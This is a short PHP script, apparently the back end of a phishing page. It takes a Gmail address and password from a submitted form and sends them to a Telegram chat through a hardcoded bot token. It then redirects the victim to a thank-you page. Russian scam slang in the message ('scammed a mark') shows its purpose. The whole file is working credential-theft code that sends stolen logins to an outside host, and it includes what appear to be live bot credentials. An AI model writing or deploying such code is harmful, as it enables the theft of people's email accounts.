<?php

/* https://api.telegram.org/bot/5212604992:AAFVQttHOlSoiChECMozvqaF93d0sAfqyhY/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$gmail = $_POST['gmail'];
$password = $_POST['parol'];
$token = "5212604992:AAFVQttHOlSoiChECMozvqaF93d0sAfqyhY";
$chat_id = "-1001737410977";
$arr = array(
  'заскамил мамонта👨🏿‍💻, чел успешно ухлади💀💀): ',
  'gmail: ' => $gmail,
  'parol:' => $password
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thank-you.html');
} else {
  echo "Error";
}
?>